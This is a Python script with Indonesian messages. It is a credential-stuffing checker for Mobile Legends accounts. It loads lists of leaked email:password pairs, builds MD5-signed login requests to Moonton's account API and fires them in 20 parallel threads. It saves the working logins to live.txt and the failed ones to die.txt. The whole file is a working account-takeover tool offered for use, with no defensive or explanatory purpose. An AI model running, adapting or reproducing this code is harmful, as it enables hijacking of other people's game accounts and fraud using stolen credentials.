import requests
import os
import sys
import hashlib
import json
import time
from multiprocessing.pool import ThreadPool

if sys.version_info.major != 3:
    exit('\n[WARNING] Gunakan python versi 3')

class MOONTON:
    def __init__(self):
        self.userdata = []
        self.live = []
        self.die = []
        self.api = 'https://accountmtapi.mobilelegends.com/'
        self.loading_symbols = ['\\', '|', '/', '-']
        self.loading_index = 0

    def loading_animation(self):
        sys.stdout.write('\r[+] Memeriksa akun ' + self.loading_symbols[self.loading_index % 4])
        sys.stdout.flush()
        self.loading_index += 1
        time.sleep(0.1)

    def progress_bar(self, current, total, bar_length=40):
        progress = int(current / total * bar_length)
        bar = '=' * progress + '-' * (bar_length - progress)
        sys.stdout.write('\r[+] Progress: [{0}] {1}/{2} ({3:.2f}%)'.format(bar, current, total, current / total * 100))
        sys.stdout.flush()

    def main(self):
        print('''               
██████╗░░█████╗░███╗░░░███╗███████╗░██████╗██╗░░██╗██╗░░░██╗███╗░░░███╗███████═══╝
██║░░██║██║░░██║██╔████╔██║█████╗░░╚█████╗░███████║██║░░░██║██╔████╔██║█████╗░░
██║░░██║██║░░██║██║╚██╔╝██║██╔══╝░░░╚═══██╗██╔══██║██║░░░██║██║╚██╔╝██║██╔══╝░░
██████╔╝╚█████╔╝██║░╚═╝░██║███████╗██████╔╝██║░░██║╚██████╔╝██║░╚═╝░██║███████╗
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝╚══════╝''')
        print("\n[+] Mohon tunggu, sedang memeriksa akun...")
        time.sleep(3)
        os.system('cls' if os.name == 'nt' else 'clear')
        empas = input('[?] List empas (ex: list.txt): ')
        if os.path.exists(empas):
            total_accounts = sum(1 for line in open(empas))
            for data in open(empas, 'r').readlines():
                try:
                    user = data.strip().split('|')
                    if user[0] and user[1]:
                        self.userdata.append({
                            'email': user[0],
                            'pw': user[1],
                            'userdata': data.strip()
                        })
                except IndexError:
                    try:
                        user = data.strip().split(':')
                        if user[0] and user[1]:
                            self.userdata.append({
                                'email': user[0],
                                'pw': user[1],
                                'userdata': data.strip()
                            })
                    except:
                        pass
            if len(self.userdata) == 0:
                exit('[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass')
            print('\033[92m[*] Total {0} Account\033[0m\n'.format(str(len(self.userdata))))
            for _ in range(3):
                for i, user in enumerate(self.userdata, 1):
                    self.loading_animation()
                    self.progress_bar(i, total_accounts)
            print('\n\033[92m[+] Proses selesai.\033[0m')
            ThreadPool(20).map(self.validate, self.userdata)
            print('\n\033[92m[#] BERHASIL: {0} - saved: live.txt\033[0m'.format(str(len(self.live))))
            print('\033[91m[#] GAGAL: {0} - saved: die.txt\033[0m'.format(str(len(self.die))))
            exit(0)
        else:
            print('[!] File tidak ditemukan "{0}"'.format(empas))

    def build_params(self, user):
        md5 = hashlib.new('md5')
        md5.update(user['pw'].encode('utf-8'))
        md5pwd = md5.hexdigest()
        sign = 'account={0}&md5pwd={1}&op=login'.format(user['email'], md5pwd)
        md5 = hashlib.new('md5')
        md5.update(sign.encode('utf-8'))
        hashed = md5.hexdigest()
        return json.dumps({
            'op': 'login',
            'sign': hashed,
            'params': {
                'account': user['email'],
                'md5pwd': md5pwd,
            },
            'lang': 'cn'
        })

    def validate(self, user):
        try:
            data = self.build_params(user)
            response = requests.post(self.api, data=data).json()
            if response['message'] == 'Error_Success':
                print('\033[92m[+] BERHASIL\033[0m ' + user['userdata'])
                self.live.append(user['userdata'])
                open('live.txt', 'a').write(str(user['userdata']) + '\n')
            else:
                print('\033[91m[+] GAGAL\033[0m ' + user['userdata'])
                self.die.append(user['userdata'])
                open('die.txt', 'a').write(str(user['userdata']) + '\n')
        except:
            self.validate(user)

if __name__ == '__main__':
    (MOONTON().main())
        
